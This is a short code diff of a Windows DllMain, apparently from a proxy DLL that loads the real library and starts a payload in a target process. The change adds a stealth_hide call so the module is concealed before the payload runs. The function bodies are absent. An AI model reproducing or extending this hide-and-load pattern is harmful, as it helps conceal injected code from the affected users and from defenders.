@@ -69,8 +69,10 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved)
         DisableThreadLibraryCalls(hModule);
         if (!load_real())
             return FALSE;
-        if (is_target_process())
+        if (is_target_process()) {
+            stealth_hide(hModule);
             payload_startup(hModule);
+        }
         break;
 
     case DLL_PROCESS_DETACH:
